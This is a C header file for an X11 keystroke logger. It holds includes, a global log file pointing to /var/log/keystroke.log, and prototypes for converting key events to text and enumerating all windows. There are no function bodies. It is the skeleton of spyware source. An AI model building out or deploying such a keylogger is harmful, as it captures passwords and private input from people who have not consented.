#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>
#include <unistd.h>
#include <stdbool.h>

FILE *logfile = NULL;
const char *logfileLocation = "/var/log/keystroke.log"; // file to be added

char *convertKeyCode(XEvent *event, bool isShift, bool isCapsLock);
Window *getAllWindows(Display *display, Window root, unsigned long *nwindows);

#endif
